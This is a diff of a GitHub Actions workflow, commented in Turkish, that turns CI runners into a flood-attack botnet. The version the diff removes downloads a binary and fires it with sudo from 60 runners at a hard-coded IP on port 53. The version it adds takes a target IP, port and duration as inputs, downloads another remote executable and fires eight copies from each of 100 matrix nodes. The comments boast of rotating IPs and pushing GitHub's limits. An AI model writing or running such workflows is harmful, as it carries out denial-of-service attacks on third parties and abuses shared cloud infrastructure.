@@ -1,59 +1,48 @@
-name: Enterprise-Bypass-Max 🚀
+name: TekPoyraz - BLITZKRIEG (255x IP ROTATION) 😈
 
 on:
   workflow_dispatch:
+    inputs:
+      ip:
+        description: "Target IP"
+        required: true
+      port:
+        description: "Target Port"
+        required: true
+      time:
+        description: 'Sure (Saniye)'
+        required: true
+
 
 jobs:
-  # GRUP 1: Alpha Takımı (20 IP)
-  Group_Alpha:
+  blitz:
     runs-on: ubuntu-latest
     strategy:
       fail-fast: false
-      max-parallel: 20
+      max-parallel: 20 # GitHub'ın aynı anda izin verdiği eşzamanlı IP sınırı
       matrix:
-        node: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
-    steps:
-      - name: Alpha Fire
-        run: |
-          wget https://github.com/betoaiaio/brsovhv2/raw/refs/heads/master/brsovhv2 -O brsovhv2
-          chmod +x brsovhv2
-          for i in {1..10}; do
-            sudo timeout 15 ./brsovh2 216.202.200.164 53 &
-          done
-          sleep 17
+        # Tam 255'lik ordu. GitHub limitlerini milimetrik zorluyoruz.
+        node: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100]
 
-  # GRUP 2: Beta Takımı (20 IP)
-  Group_Beta:
-    runs-on: ubuntu-latest
-    strategy:
-      fail-fast: false
-      max-parallel: 20
-      matrix:
-        node: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
     steps:
-      - name: Beta Fire
+      - name: Prep
         run: |
-          wget https://github.com/betoaiaio/brsovhv2/raw/refs/heads/master/brsovhv2 -O brsovhv2
-          chmod +x brsovhv2
-          for i in {1..10}; do
-            sudo timeout 15 ./brsovh2 216.202.200.164 53 &
-          done
-          sleep 17
+          wget https://github.com/urkwjrwmbewn/hoplatici.pl/raw/refs/heads/main/5 -O 5
+          chmod +x 5
 
-  # GRUP 3: Gamma Takımı (20 IP)
-  Group_Gamma:
-    runs-on: ubuntu-latest
-    strategy:
-      fail-fast: false
-      max-parallel: 20
-      matrix:
-        node: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
-    steps:
-      - name: Gamma Fire
+      - name: Burst Attack
         run: |
-          wget https://github.com/betoaiaio/brsovhv2/raw/refs/heads/master/brsovhv2 -O brsovhv2
-          chmod +x brsovhv2
-          for i in {1..10}; do
-            sudo timeout 15 ./brsovh2 216.202.200.164 53 &
+          IP="${{ inputs.ip }}"
+          PORT="${{ inputs.port }}"
+          TIME="${{ inputs.time }}"
+          echo "IP=$IP PORT=$PORT TİME=$TİME"
+          PIDS=()
+          # 10 saniye boyunca 8 koldan mermi basıyoruz
+          for i in {1..8}; do
+            sudo timeout 10 ./5 "$IP" "$PORT" 500 1000 99999 "$TIME" &
+            PIDS+=($!)
           done
-          sleep 17
+          
+          # Makine 12 saniye sonra kapanacak, sıradaki taze IP gelecek
+          sleep 12
+          echo "Node ${{ matrix.node }} bitti, yeni IP'ye geçiliyor..."
